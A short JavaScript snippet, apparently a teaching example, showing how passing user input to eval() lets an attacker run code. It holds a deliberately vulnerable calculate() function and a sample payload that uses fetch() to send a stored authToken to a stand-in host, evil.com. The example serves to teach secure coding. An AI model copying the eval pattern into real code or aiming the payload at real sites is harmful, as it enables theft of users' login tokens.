// Vulnerable: user input is passed straight into eval()
function calculate(userExpression) {
    return eval(userExpression);
}

// An attacker submits this as their "expression":
const maliciousInput = "fetch('https://evil.com/steal?data=' + localStorage.getItem('authToken'))";
calculate(maliciousInput);

//Instead of evaluating a harmless math expression like "2 + 2", the attacker's string runs as a real script, in this case exfiltrating a stored authentication token.